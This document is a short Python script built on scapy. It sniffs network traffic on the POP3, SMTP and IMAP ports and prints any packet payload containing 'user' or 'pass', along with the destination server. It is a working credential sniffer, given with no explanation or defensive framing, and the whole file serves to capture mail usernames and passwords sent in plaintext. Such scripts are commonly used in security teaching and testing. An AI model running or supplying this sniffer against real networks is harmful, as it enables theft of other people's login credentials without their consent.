from scapy.all import *


def packet_callback(packet):
    if packet[TCP].payload:
        mail_payload = str(packet[TCP].payload)
        if "user" in mail_payload.lower() or "pass" in mail_payload.lower():
            print("Server: %s"%packet[IP].dst)
            print("%s"%packet[TCP].payload)



sniff(prn=packet_callback, store=0 ,filter= "tcp port 110 or tcp port 25 or tcp port 143")